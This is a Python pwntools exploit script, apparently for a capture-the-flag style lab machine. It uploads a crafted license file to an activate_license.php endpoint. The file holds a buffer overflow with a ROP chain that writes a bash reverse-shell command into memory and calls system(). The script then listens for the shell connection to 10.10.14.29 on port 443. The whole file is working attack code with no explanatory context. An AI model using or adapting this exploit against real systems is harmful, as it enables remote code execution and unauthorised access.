#!/usr/bin/python3

from pwn import *
import threading, signal, pdb, requests, sys

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
upload_url = "http://10.10.11.154/activate_license.php"
lport = 443
burp = {'http': 'http:/127.0.0.1:8080'}

def makeExploit():

    active_license_base = 0x55ca9f376000
    libc_base = 0x7fcbb86dc000

    writable = active_license_base + 0x00004000

    system = p64(libc_base + 0x00048e50)

    offset = 520

    cmd = b"bash -c 'bash -i >& /dev/tcp/10.10.14.29/443 0>&1'"

    rop = b''
    rop += b"A"*offset

# rdi, rsi, rdx, rcx, r8, r9

# ROP Gadget
    pop_rdi = p64(active_license_base + 0x000181b) # pop rdi; ret
    pop_rsi = p64(libc_base + 0x0002890f) # pop rsi; ret
    mov_rdi_rsi = p64(libc_base + 0x000603b2) # mov [rdi], rsi; ret

    for i in range(0, len(cmd), 8):

        rop += pop_rdi
        rop += p64(writable+i)
        rop += pop_rsi
        rop += cmd[i:i+8].ljust(8, b"\x00")
        rop += mov_rdi_rsi

# system("bash -c 'bash -i >& /dev/tcp/10.10.14.29/443 0>&1'")

    rop += pop_rdi
    rop += p64(writable)
    rop += system

    with open("file.key", "wb") as f:
        f.write(rop)

    file_to_upload = {'licensefile': ("file.key", open("file.key", "rb"), 'application/x-iwork-keynote-sffkey')}

    r = requests.post(upload_url, files=file_to_upload)

if __name__ == '__main__':

    try:
        threading.Thread(target=makeExploit, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    shell.interactive()
